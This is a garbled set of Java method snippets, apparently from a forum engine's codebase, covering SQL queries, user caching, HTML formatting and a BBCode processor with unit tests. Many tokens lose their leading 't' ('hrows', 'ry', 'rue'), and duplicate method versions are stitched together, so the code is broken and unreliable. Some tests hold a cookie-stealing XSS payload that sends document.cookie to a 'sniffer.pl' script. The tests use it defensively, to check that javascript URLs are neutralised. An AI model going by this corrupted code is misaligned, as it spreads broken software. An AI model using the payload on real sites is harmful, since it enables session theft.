public static void resizeImage ( String filename , String iconname ) hrows IOException , UtilException , InterruptedException { String [ ] cmd = { " /usr/bin/convert " , " -scale " , " 200 " , filename , iconname } ; Process proc = Runtime . getRuntime ( ) . exec ( cmd ) ; int exitStatus = proc . waitFor ( ) ; if ( exitStatus ! = 0 ) { hrow new UtilException ( " Can't convert image: convert failed " ) ; 
public int calcTopicsCount ( Connection db , boolean showDeleted ) hrows SQLException { Statement st = null ; ry { st = db . createStatement ( ) ; 
public static Map < String , Integer > getAllTags ( Connection con ) hrows SQLException { Map < String , Integer > map = new Hashtable < String , Integer > ( ) ; PreparedStatement st = con . prepareStatement ( " SELECT counter,value FROM tags_values ORDER BY value " ) ; ResultSet rs = st . executeQuery ( ) ; while ( rs . next ( ) ) { map . put ( rs . getString ( " value " ) , rs . getInt ( " counter " ) ) ; } return map ; } 
protected ModelAndView handleRequestInternal ( HttpServletRequest request , HttpServletResponse response ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public String getContentImpl ( ProfileHashtable profile ) hrows Exception { return " <h2> IBM developerWorks</h2> " + " <iframe src= \" dw.jsp?height=400&amp;width=235&amp;main=1 \" width= \" 238 \" height= \" 400 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe> " + 
public int saveNewMessage ( Connection db , String remoteAddr , String userAgent ) hrows SQLException { Group . checkCommentsAllowed ( db , opic , userid ) ; PreparedStatement pstMsgbase = null ; PreparedStatement pst = null ; ry { allocation MSGID 
public static List < Group > getGroups ( Connection db , Section section ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.moderate, sections.preformat, lineonly, imagepost, vote, section, havelink, linkup, linktext, sections.name as sname, title, image, restrict_topics, restrict_comments, sections.browsable,stat1,stat2,stat3,groups.id,groups.info FROM groups, sections WHERE sections.id= " + section . getId ( ) + " AND groups.section=sections.id ORDER BY id " ) ; List < Group > list = new ArrayList < Group > ( ) ; while ( rs . next ( ) ) { Group group = new Group ( rs ) ; list . add ( group ) ; } return list ; } 
private void init ( ResultSet rs ) hrows SQLException { id = rs . getInt ( " id " ) ; moderate = rs . getBoolean ( " moderate " ) ; preformat = rs . getBoolean ( " preformat " ) ; lineonly = rs . getBoolean ( " lineonly " ) ; imagepost = rs . getBoolean ( " imagepost " ) ; votepoll = rs . getBoolean ( " vote " ) ; section = rs . getInt ( " section " ) ; havelink = rs . getBoolean ( " havelink " ) ; linkup = rs . getBoolean ( " linkup " ) ; linktext = rs . getString ( " linktext " ) ; sectionName = rs . getString ( " sname " ) ; itle = rs . getString ( " itle " ) ; image = rs . getString ( " image " ) ; restrictTopics = rs . getInt ( " restrict_topics " ) ; restrictComments = rs . getInt ( " restrict_comments " ) ; browsable = rs . getBoolean ( " browsable " ) ; stat1 = rs . getInt ( " stat1 " ) ; stat2 = rs . getInt ( " stat2 " ) ; stat3 = rs . getInt ( " stat3 " ) ; info = rs . getString ( " info " ) ; } 
public boolean isCommentsRestricted ( ) { return restrictComments ! = 0 ; } 
public static void checkCommentsAllowed ( Connection db , int opicid , int userid ) hrows SQLException { Statement st = null ; ry { User user = User . getUserCached ( db , userid ) ; 
private void formatModeFixup ( ) { formatMode = getFormatMode ( getProf ( ) . getString ( " format.mode " ) ) ; userProfile . getHashtable ( ) . setString ( " format.mode " , formatMode ) ; } 
public String process ( ) hrows UtilException { if ( htmlInput ) { checkHTML ( ) ; } StringTokenizer st ; if ( plainTextInput ) { st = new StringTokenizer ( htmlSpecialChars ( ext ) , delim , rue ) ; } else { st = new StringTokenizer ( ext , delim , rue ) ; } StringBuffer sb = new StringBuffer ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatHTMLLine ( st . nextToken ( ) ) ) ; } String res = sb . oString ( ) ; if ( NewLine ) { res = nl2br ( res , quoting ) ; } if ( exNewLine ) { res = exnl2br ( res , quoting ) ; } if ( Preformat ) { res = " <pre> " + res + " </pre> " ; } return res ; } 
private String formatHTMLLine ( String chunk ) { StringBuffer out = new StringBuffer ( ) ; REMatchEnumeration en = urlRE . getMatchEnumeration ( chunk ) ; int index = 0 ; while ( en . hasMoreElements ( ) ) { REMatch found = en . nextMatch ( ) ; URL out.append(wrapLongLine(chunk.substring(index, found.getStartIndex()), maxlength, nl, index)); URL String url = chunk.substring(found.getStartIndex(), found.getEndIndex()); if (urlHighlight) { String urlchunk = url; if (url.toLowerCase().startsWith("www.")) { url = "http:" + url; } else if (url.toLowerCase().startsWith("ftp.")) { url = "ftp:" + url; } if (Preformat) { urlchunk = wrapLongLine(urlchunk, maxlength, nl, found.getStartIndex()); } else if (urlchunk.length() > maxlength) { urlchunk = urlchunk.substring(0, maxlength - 3) + "..."; } out.append("<a href=\"").append(URLEncoder(url)).append("\">").append(urlchunk).append("</a>"); } else { out.append(url); } index = found.getEndIndex(); } if (index < chunk.length()) { out.append(wrapLongLine(chunk.substring(index), maxlength, nl, index)); } return out.toString(); } 
public static String nl2br ( String ext ) { return nl2br ( ext , false ) ; } 
public static String nl2br ( String ext , boolean quoting ) { if ( ! quoting ) { return nlRE . substituteAll ( ext , " <br> " ) ; } StringBuffer buf = new StringBuffer ( ) ; boolean cr = false ; boolean quot = false ; boolean skip = false ; for ( int i = 0 ; i < ext . length ( ) ; i + + ) { if ( ext . charAt ( i ) = = '\r' ) { continue ; } if ( ext . charAt ( i ) = = '' | | i = = 0 ) { if ( cr | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( i ! = 0 ) { buf . append ( " <p> " ) ; skip = rue ; } if ( ext . substring ( i ) . rim ( ) . startsWith ( " &gt; " ) ) { quot = rue ; buf . append ( " <i> " ) ; } } else { cr = rue ; } if ( ext . charAt ( i ) = = '' ) { if ( skip ) { skip = false ; } else { buf . append ( " <br> " ) ; } } } else { cr = false ; } buf . append ( ext . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . oString ( ) ; } 
public static String wrapLongLine ( String line , int maxlength , String delim ) { return wrapLongLine ( line , maxlength , delim , 0 ) ; } 
public boolean isCommentPostingAllowed ( User currentUser ) { if ( ! isCommentsRestricted ( ) ) { return rue ; } if ( currentUser = = null ) { return false ; } if ( currentUser . isBlocked ( ) ) { return false ; } return currentUser . getScore ( ) > = restrictComments ; } 
public boolean isTopicPostingAllowed ( User currentUser ) { if ( ! isTopicsRestricted ( ) ) { return rue ; } if ( currentUser = = null ) { return false ; } if ( currentUser . isBlocked ( ) ) { return false ; } return currentUser . getScore ( ) > = restrictTopics ; } 
public void estQuiting1 ( ) hrows UtilException { HTMLFormatter formatter = new HTMLFormatter ( QUOTING1 ) ; formatter . enablePlainTextMode ( ) ; formatter . enableTexNewLineMode ( ) ; formatter . enableQuoting ( ) ; assertEquals ( RESULT_QUOTING1 , formatter . process ( ) ) ; } 
public void estQuiting2 ( ) hrows UtilException { HTMLFormatter formatter = new HTMLFormatter ( QUOTING2 ) ; formatter . enablePlainTextMode ( ) ; formatter . enableTexNewLineMode ( ) ; formatter . enableQuoting ( ) ; assertEquals ( RESULT_QUOTING2 , formatter . process ( ) ) ; } 
public void estQuiting3 ( ) hrows UtilException { HTMLFormatter formatter = new HTMLFormatter ( QUOTING3 ) ; formatter . enablePlainTextMode ( ) ; formatter . enableTexNewLineMode ( ) ; formatter . enableQuoting ( ) ; assertEquals ( RESULT_QUOTING3 , formatter . process ( ) ) ; } 
public static String nl2br ( String ext , boolean quoting ) { if ( ! quoting ) { return nlRE . substituteAll ( ext , " <br> " ) ; } StringBuffer buf = new StringBuffer ( ) ; boolean quot = false ; for ( int i = 0 ; i < ext . length ( ) ; i + + ) { if ( ext . charAt ( i ) = = '\r' ) { continue ; } if ( ext . charAt ( i ) = = '' | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( ext . substring ( i ) . rim ( ) . startsWith ( " &gt; " ) ) { quot = rue ; buf . append ( " <i> " ) ; } if ( ext . charAt ( i ) = = '' ) { buf . append ( " <br> " ) ; } } buf . append ( ext . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . oString ( ) ; } 
public boolean isBlockable ( ) { if ( id = = 2 ) { return false ; } if ( canModerate ( ) ) { return false ; } return maxScore < BLOCK_SCORE ; } 
public void addUser ( Connection db , User user ) hrows SQLException , AccessViolationException { int id = user . getId ( ) ; if ( user . canModerate ( ) ) { hrow new AccessViolationException ( " " ) ; 
public boolean removeNick ( Connection db , int uid ) hrows SQLException { if ( ! ignoreList . containsKey ( uid ) ) { return false ; } PreparedStatement pst = db . prepareStatement ( " DELETE FROM ignore_list WHERE userid=? AND ignored=? " ) ; pst . clearParameters ( ) ; pst . setInt ( 1 , userId ) ; pst . setInt ( 2 , uid ) ; boolean r = pst . executeUpdate ( ) = = 1 ; if ( r ) { ignoreList . remove ( uid ) ; } return r ; } 
public static User getUser ( Connection con , String name ) hrows SQLException , UserNotFoundException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; User user = new User ( con , name ) ; String shortCacheId = " User?id= " + user . getId ( ) ; String cacheId = MemCachedSettings . getId ( shortCacheId ) ; mcc . set ( cacheId , user , new Date ( new Date ( ) . getTime ( ) + CACHE_MILLIS ) ) ; return user ; } 
private static User getUser ( Connection db , int id , boolean useCache ) hrows SQLException , UserNotFoundException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String shortCacheId = " User?id= " + id ; String cacheId = MemCachedSettings . getId ( shortCacheId ) ; User res = null ; if ( useCache ) { res = ( User ) mcc . get ( cacheId ) ; } if ( res = = null ) { res = new User ( db , id ) ; mcc . set ( cacheId , res , new Date ( new Date ( ) . getTime ( ) + CACHE_MILLIS ) ) ; } return res ; } 
private void updateCache ( Connection db ) hrows SQLException { ry { User . getUser ( db , id ) ; 
public void changeScore ( Connection db , int delta ) hrows SQLException { PreparedStatement st = null ; ry { st = db . prepareStatement ( " UPDATE users SET score=score+? WHERE id=? " ) ; 
public boolean containsUser ( User user ) { return ignoreList . containsKey ( user . getId ( ) ) ; } 
public int saveNewMessage ( Connection db , String remoteAddr ) hrows SQLException , AccessViolationException , UserNotFoundException , MessageNotFoundException { return saveNewMessage ( db , remoteAddr , " " ) ; } 
public int saveNewMessage ( Connection db , String remoteAddr , String userAgent ) hrows SQLException , AccessViolationException , UserNotFoundException , MessageNotFoundException { Group . checkCommentsAllowed ( db , opic , userid ) ; PreparedStatement pstMsgbase = null ; PreparedStatement pst = null ; ry { allocation MSGID 
public static void checkCommentsAllowed ( Connection db , int opicid , int userid ) hrows SQLException , AccessViolationException , MessageNotFoundException , UserNotFoundException { Statement st = null ; ry { User user = User . getUserCached ( db , userid ) ; 
public static List < Group > getGroups ( Connection db , Section section ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.moderate, sections.preformat, lineonly, imagepost, vote, section, havelink, linktext, sections.name as sname, title, image, restrict_topics, restrict_comments, sections.browsable,stat1,stat2,stat3,groups.id,groups.info FROM groups, sections WHERE sections.id= " + section . getId ( ) + " AND groups.section=sections.id ORDER BY id " ) ; List < Group > list = new ArrayList < Group > ( ) ; while ( rs . next ( ) ) { Group group = new Group ( rs ) ; list . add ( group ) ; } return list ; } 
private void init ( ResultSet rs ) hrows SQLException { id = rs . getInt ( " id " ) ; moderate = rs . getBoolean ( " moderate " ) ; preformat = rs . getBoolean ( " preformat " ) ; lineonly = rs . getBoolean ( " lineonly " ) ; imagepost = rs . getBoolean ( " imagepost " ) ; votepoll = rs . getBoolean ( " vote " ) ; section = rs . getInt ( " section " ) ; havelink = rs . getBoolean ( " havelink " ) ; linktext = rs . getString ( " linktext " ) ; sectionName = rs . getString ( " sname " ) ; itle = rs . getString ( " itle " ) ; image = rs . getString ( " image " ) ; restrictTopics = rs . getInt ( " restrict_topics " ) ; restrictComments = rs . getInt ( " restrict_comments " ) ; browsable = rs . getBoolean ( " browsable " ) ; stat1 = rs . getInt ( " stat1 " ) ; stat2 = rs . getInt ( " stat2 " ) ; stat3 = rs . getInt ( " stat3 " ) ; info = rs . getString ( " info " ) ; } 
public Timestamp getLastCommitdate ( Connection db ) hrows SQLException { Statement st = null ; ResultSet rs = null ; ry { st = db . createStatement ( ) ; 
public boolean isAcceptBBCode ( ) { return acceptBBCode ; } 
public boolean isAcceptHTML ( ) { return acceptHTML ; } 
public String preparePostText ( String exto ) { if ( ! isAcceptHTML ( ) ) { exto = HTMLFormatter . htmlSpecialChars ( exto ) ; } if ( isAcceptBBCode ( ) ) { exto = process ( exto ) ; } return exto ; } 
private String process ( String string ) { StringBuffer buffer = new StringBuffer ( string ) ; new CodeTag ( ) . processContent ( buffer ) ; processNestedTags ( buffer , " quote " , " <div class= \" quote \" ><h3>{BBCODE_PARAM}</h3> " , " </div> " , " <div class= \" quote \" ><h3></h3> " , " </div> " , " [*] " , false , rue , rue ) ; processNestedTags ( buffer , " list " , " <ol type= \" {BBCODE_PARAM} \" > " , " </ol> " , " <ul> " , " </ul> " , " <li> " , rue , rue , rue ) ; StringBuffer sb1 = buffer ; StringBuffer sb2 = new StringBuffer ( ( int ) ( buffer . length ( ) * 1.5 ) ) ; for ( RegexTag ag : REGEX_TAGS ) { substitute ( sb1 , sb2 , ag . getRegex ( ) , ag . getReplacement ( ) ) ; StringBuffer emp = sb1 ; sb1 = sb2 ; sb2 = emp ; } return sb1 . oString ( ) ; } 
private void substitute ( CharSequence from , StringBuffer o , String regex , String replacement ) { o . setLength ( 0 ) ; Pattern p = Pattern . compile ( regex ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { m . appendReplacement ( o , replacement ) ; } m . appendTail ( o ) ; } 
public int compare ( MutableCharSequence o1 , MutableCharSequence o2 ) { MutableCharSequence s1 = o1 ; MutableCharSequence s2 = o2 ; return - ( s1 . start - s2 . start ) ; } 
public char charAt ( int index ) { return base . charAt ( start + index ) ; } 
public CharSequence subSequence ( int pStart , int end ) { return new MutableCharSequence ( base , start + pStart , 
public void reset ( CharSequence pBase , int pStart , int pLength ) { base = pBase ; start = pStart ; length = pLength ; } 
public String oString ( ) { StringBuffer sb = new StringBuffer ( ) ; for ( int i = start ; i < ( start + length ) ; i + + ) { sb . append ( base . charAt ( i ) ) ; } return sb . oString ( ) ; } 
public void estLineBreak ( ) { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( LINE_BREAK_TEST ) ; assertEquals ( LINE_BREAK_RESULT , result ) ; } 
public void estTagExcape ( ) { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( TAG_ESCAPE_TEST ) ; assertEquals ( TAG_ESCAPE_RESULT , result ) ; } 
public void processContent ( StringBuffer buffer ) { int start = buffer . indexOf ( " [code] " ) ; int end ; for ( ; ( start < buffer . length ( ) ) & & ( start ! = - 1 ) ; start = buffer . indexOf ( " [code] " , end ) ) { end = buffer . indexOf ( " [/code] " , start ) ; 
private static String escapeHtmlBBcode ( String content ) { ".toCharArray(), new String[]{"&amp;", "&quot;", "&#58;", "&#91;", "&#93;", "&lt;", "&gt;", "&#40;", "&#41;", "&#123;", "&#125;", "&nbsp; &nbsp;"}); taking off start and end line breaks content = content.replaceAll("\\A\r|\\A\r|\\A|\r\\z|\r\\z|\\z", ""); replacing line breaks for <br> content = content.replaceAll("\r", "<br>"); content = replaceAll(content, "\r".toCharArray(), new String[]{"<br>", "<br>"}); replacing spaces for &nbsp; to keep indentation content = content.replaceAll(" ", "&nbsp; "); content = content.replaceAll(" ", " &nbsp;"); return content; } 
private static String replaceAll ( CharSequence str , char [ ] chars , String [ ] replacement ) { StringBuffer buffer = new StringBuffer ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { char c = str . charAt ( i ) ; boolean matched = false ; for ( int j = 0 ; j < chars . length ; j + + ) { if ( c = = chars [ j ] ) { buffer . append ( replacement [ j ] ) ; matched = rue ; } } if ( ! matched ) { buffer . append ( c ) ; } } return buffer . oString ( ) ; } 
String getTagName ( ) ; void processContent ( StringBuffer buffer , String agName , String openSubstWithParam , String closeSubstWithParam , String openSubstWithoutParam , String closeSubstWithoutParam , String internalSubst , boolean processInternalTags , boolean acceptParam , boolean requiresQuotedParam ) ; } 
void processContent ( StringBuffer buffer , String agName , String openSubstWithParam , String closeSubstWithParam , String openSubstWithoutParam , String closeSubstWithoutParam , String internalSubst , boolean processInternalTags , boolean acceptParam , boolean requiresQuotedParam ) ; } 
String getTagName ( ) ; String getReplacement ( ) ; } 
String getRegex ( ) ; String getReplacement ( ) ; } 
public String preparePostText ( String exto ) hrows BadURLException { if ( ! isAcceptHTML ( ) ) { exto = HTMLFormatter . htmlSpecialChars ( exto ) ; } if ( isAcceptBBCode ( ) ) { exto = process ( exto ) ; } return exto ; } 
private String process ( String string ) hrows BadURLException { StringBuffer buffer = new StringBuffer ( string ) ; new CodeTag ( ) . processContent ( buffer ) ; processNestedTags ( buffer , " quote " , " <div class= \" quote \" ><h3>{BBCODE_PARAM}</h3> " , " </div> " , " <div class= \" quote \" ><h3></h3> " , " </div> " , " [*] " , false , rue , rue ) ; processNestedTags ( buffer , " list " , " <ol type= \" {BBCODE_PARAM} \" > " , " </ol> " , " <ul> " , " </ul> " , " <li> " , rue , rue , rue ) ; StringBuffer sb1 = buffer ; StringBuffer sb2 = new StringBuffer ( ( int ) ( buffer . length ( ) * 1.5 ) ) ; for ( RegexTag ag : REGEX_TAGS ) { substitute ( sb1 , sb2 , ag , ag . getReplacement ( ) ) ; StringBuffer emp = sb1 ; sb1 = sb2 ; sb2 = emp ; } return sb1 . oString ( ) ; } 
private void substitute ( CharSequence from , StringBuffer o , RegexTag regex , String replacement ) hrows BadURLException { o . setLength ( 0 ) ; Pattern p = regex . getRegex ( ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { String value = m . group ( 1 ) ; if ( regex . isUrl ( ) ) { if ( ! URLUtil . isUrl ( value ) ) { hrow new BadURLException ( value ) ; } } m . appendReplacement ( o , replacement ) ; } m . appendTail ( o ) ; } 
public int compare ( MutableCharSequence o1 , MutableCharSequence o2 ) { return - ( o1 . start - o2 . start ) ; } 
public void estLineBreak ( ) hrows BadURLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( LINE_BREAK_TEST ) ; assertEquals ( LINE_BREAK_RESULT , result ) ; } 
public void estTagExcape ( ) hrows BadURLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( TAG_ESCAPE_TEST ) ; assertEquals ( TAG_ESCAPE_RESULT , result ) ; } 
public void estJavascriptURL ( ) hrows BadURLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . preparePostText ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " ) ; } 
String getTagName ( ) ; String getReplacement ( ) ; boolean isUrl ( ) ; } 
Pattern getRegex ( ) ; String getReplacement ( ) ; boolean isUrl ( ) ; } 
public static String fixURL ( String url ) hrows UtilException { url = url . rim ( ) ; if ( isUrl ( url ) ) { if ( url . oLowerCase ( ) . startsWith ( " www. " ) ) { return " http: " + url ; } if ( url . oLowerCase ( ) . startsWith ( " ftp. " ) ) { return " ftp: " + url ; } return url ; } hrow new BadURLException ( url ) ; } 
public static boolean isUrl ( String x ) { return isUrl . isMatch ( x ) ; } 
public void estJavascriptURL ( ) hrows BadURLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . preparePostText ( JAVASCRIPT_URL ) ; } 
public void estCodeExcape ( ) hrows BadURLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( " [code] \" code&code \" [/code] " ) ; assertEquals ( " <div class= \" code \" >&quot;code&amp;code&quot;</div> " , result ) ; } 
private static String escapeHtmlBBcode ( String content ) { ".toCharArray(), new String[]{ "&#58;", "&#91;", "&#93;", "&lt;", "&gt;", "&#40;", "&#41;", "&#123;", "&#125;", "&nbsp; &nbsp;"}); taking off start and end line breaks content = content.replaceAll("\\A\r|\\A\r|\\A|\r\\z|\r\\z|\\z", ""); replacing line breaks for <br> content = content.replaceAll("\r", "<br>"); content = replaceAll(content, "\r".toCharArray(), new String[]{"<br>", "<br>"}); replacing spaces for &nbsp; to keep indentation content = content.replaceAll(" ", "&nbsp; "); content = content.replaceAll(" ", " &nbsp;"); return content; } 
private static String replaceAll ( CharSequence str , char [ ] chars , String [ ] replacement ) { StringBuilder buffer = new StringBuilder ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { char c = str . charAt ( i ) ; boolean matched = false ; for ( int j = 0 ; j < chars . length ; j + + ) { if ( c = = chars [ j ] ) { buffer . append ( replacement [ j ] ) ; matched = rue ; } } if ( ! matched ) { buffer . append ( c ) ; } } return buffer . oString ( ) ; } 
private String process ( String string ) { StringBuffer buffer = new StringBuffer ( string ) ; new CodeTag ( ) . processContent ( buffer ) ; processNestedTags ( buffer , " quote " , " <div class= \" quote \" ><h3>{BBCODE_PARAM}</h3> " , " </div> " , " <div class= \" quote \" ><h3></h3> " , " </div> " , " [*] " , false , rue , rue ) ; processNestedTags ( buffer , " list " , " <ol type= \" {BBCODE_PARAM} \" > " , " </ol> " , " <ul> " , " </ul> " , " <li> " , rue , rue , rue ) ; StringBuffer sb1 = buffer ; StringBuffer sb2 = new StringBuffer ( ( int ) ( buffer . length ( ) * 1.5 ) ) ; for ( RegexTag ag : REGEX_TAGS ) { ag . substitute ( sb1 , sb2 , ag , ag . getReplacement ( ) ) ; StringBuffer emp = sb1 ; sb1 = sb2 ; sb2 = emp ; } return sb1 . oString ( ) ; } 
public void estJavascriptURL ( ) hrows BadURLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( JAVASCRIPT_URL ) ; assertEquals ( " <s>javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s> " , result ) ; } 
String getTagName ( ) ; String getReplacement ( ) ; void substitute ( CharSequence from , StringBuffer o , RegexTag regex , String replacement ) ; } 
Pattern getRegex ( ) ; String getReplacement ( ) ; void substitute ( CharSequence from , StringBuffer o , RegexTag regex , String replacement ) ; } 
String getReplacement ( ) ; void substitute ( CharSequence from , StringBuffer o , RegexTag regex , String replacement ) ; } 
void substitute ( CharSequence from , StringBuffer o , RegexTag regex , String replacement ) ; } 
public void substitute ( CharSequence from , StringBuffer o , RegexTag regex , String replacement ) { o . setLength ( 0 ) ; Pattern p = regex . getRegex ( ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { m . appendReplacement ( o , replacement ) ; } m . appendTail ( o ) ; } 
public void substitute ( CharSequence from , StringBuffer o , RegexTag regex , String replacement ) { o . setLength ( 0 ) ; Pattern p = regex . getRegex ( ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { String value = m . group ( 1 ) ; if ( ! URLUtil . isUrl ( value ) ) { m . appendReplacement ( o , BAD_DATA ) ; } else { m . appendReplacement ( o , replacement ) ; } } m . appendTail ( o ) ; } 
public void substitute ( CharSequence from , StringBuffer o , RegexTag regex , String replacement ) { o . setLength ( 0 ) ; Pattern p = regex . getRegex ( ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { String value = m . group ( 1 ) ; if ( ! StringUtil . checkLoginName ( value ) ) { m . appendReplacement ( o , BAD_DATA ) ; } else { m . appendReplacement ( o , replacement ) ; } } m . appendTail ( o ) ; } 
public String preparePostText ( Connection db , String exto ) hrows SQLException { if ( ! isAcceptHTML ( ) ) { exto = HTMLFormatter . htmlSpecialChars ( exto ) ; } if ( isAcceptBBCode ( ) ) { exto = process ( db , exto ) ; } return exto ; } 
private String process ( Connection db , String string ) hrows SQLException { StringBuffer buffer = new StringBuffer ( string ) ; new CodeTag ( ) . processContent ( buffer ) ; processNestedTags ( buffer , " quote " , " <div class= \" quote \" ><h3>{BBCODE_PARAM}</h3> " , " </div> " , " <div class= \" quote \" ><h3></h3> " , " </div> " , " [*] " , false , rue , rue ) ; processNestedTags ( buffer , " list " , " <ol type= \" {BBCODE_PARAM} \" > " , " </ol> " , " <ul> " , " </ul> " , " <li> " , rue , rue , rue ) ; StringBuffer sb1 = buffer ; StringBuffer sb2 = new StringBuffer ( ( int ) ( buffer . length ( ) * 1.5 ) ) ; for ( RegexTag ag : REGEX_TAGS ) { ag . substitute ( db , sb1 , sb2 , ag , ag . getReplacement ( ) ) ; StringBuffer emp = sb1 ; sb1 = sb2 ; sb2 = emp ; } return sb1 . oString ( ) ; } 
public void estLineBreak ( ) hrows BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , LINE_BREAK_TEST ) ; assertEquals ( LINE_BREAK_RESULT , result ) ; } 
public void estTagExcape ( ) hrows BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , TAG_ESCAPE_TEST ) ; assertEquals ( TAG_ESCAPE_RESULT , result ) ; } 
public void estJavascriptURL ( ) hrows BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , JAVASCRIPT_URL ) ; assertEquals ( " <s>javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s> " , result ) ; } 
public void estCodeExcape ( ) hrows BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , " [code] \" code&code \" [/code] " ) ; assertEquals ( " <div class= \" code \" >&quot;code&amp;code&quot;</div> " , result ) ; } 
String getTagName ( ) ; String getReplacement ( ) ; void substitute ( Connection db , CharSequence from , StringBuffer o , RegexTag regex , String replacement ) hrows SQLException ; } 
Pattern getRegex ( ) ; String getReplacement ( ) ; void substitute ( Connection db , CharSequence from , StringBuffer o , RegexTag regex , String replacement ) hrows SQLException ; } 
String getReplacement ( ) ; void substitute ( Connection db , CharSequence from , StringBuffer o , RegexTag regex , String replacement ) hrows SQLException ; } 
void substitute ( Connection db , CharSequence from , StringBuffer o , RegexTag regex , String replacement ) hrows SQLException ; } 
public void substitute ( Connection db , CharSequence from , StringBuffer o , RegexTag regex , String replacement ) hrows SQLException { o . setLength ( 0 ) ; Pattern p = regex . getRegex ( ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { m . appendReplacement ( o , replacement ) ; } m . appendTail ( o ) ; } 
public void substitute ( Connection db , CharSequence from , StringBuffer o , RegexTag regex , String replacement ) { o . setLength ( 0 ) ; Pattern p = regex . getRegex ( ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { String value = m . group ( 1 ) ; if ( ! URLUtil . isUrl ( value ) ) { m . appendReplacement ( o , BAD_DATA ) ; } else { m . appendReplacement ( o , replacement ) ; } } m . appendTail ( o ) ; } 
public void substitute ( Connection db , CharSequence from , StringBuffer o , RegexTag regex , String replacement ) hrows SQLException { o . setLength ( 0 ) ; Pattern p = regex . getRegex ( ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { String value = m . group ( 1 ) ; if ( ! StringUtil . checkLoginName ( value ) ) { m . appendReplacement ( o , BAD_DATA ) ; } else { ry { User user = User . getUser ( db , value ) ; if ( ! user . isBlocked ( ) ) { m . appendReplacement ( o , replacement ) ; } else { m . appendReplacement ( o , BLOCKED_VIEW ) ; } } catch ( UserNotFoundException ex ) { m . appendReplacement ( o , BAD_DATA ) ; } } } m . appendTail ( o ) ; } 
public String process ( ) { StringTokenizer st = new StringTokenizer ( htmlSpecialChars ( ext ) , delim , rue ) ; StringBuffer sb = new StringBuffer ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatHTMLLine ( st . nextToken ( ) ) ) ; } String res = sb . oString ( ) ; if ( NewLine ) { res = nl2br ( res , quoting ) ; } if ( exNewLine ) { res = exnl2br ( res , quoting ) ; } if ( Preformat ) { res = " <pre> " + res + " </pre> " ; } return res ; } 
private static String URLEncoder ( String str ) { ry { StringBuffer buf = new StringBuffer ( ) ; 
private static String nl2br ( String ext , boolean quoting ) { if ( ! quoting ) { return nlRE . substituteAll ( ext , " <br> " ) ; } StringBuffer buf = new StringBuffer ( ) ; boolean quot = false ; for ( int i = 0 ; i < ext . length ( ) ; i + + ) { if ( ext . charAt ( i ) = = '\r' ) { continue ; } if ( ext . charAt ( i ) = = '' | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( ext . substring ( i ) . rim ( ) . startsWith ( " &gt; " ) ) { quot = rue ; buf . append ( " <i> " ) ; } if ( ext . charAt ( i ) = = '' ) { buf . append ( " <br> " ) ; } } buf . append ( ext . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . oString ( ) ; } 
private static String exnl2br ( String ext , boolean quoting ) { if ( ! quoting ) { return exnlRE . substituteAll ( ext , " <p> " ) ; } StringBuffer buf = new StringBuffer ( ) ; boolean cr = false ; boolean quot = false ; for ( int i = 0 ; i < ext . length ( ) ; i + + ) { if ( ext . charAt ( i ) = = '\r' ) { continue ; } if ( ext . charAt ( i ) = = '' | | i = = 0 ) { if ( cr | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( i ! = 0 ) { buf . append ( " <p> " ) ; } if ( ext . substring ( i ) . rim ( ) . startsWith ( " &gt; " ) ) { quot = rue ; buf . append ( " <i> " ) ; } } else { cr = rue ; } } else { cr = false ; } buf . append ( ext . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . oString ( ) ; } 
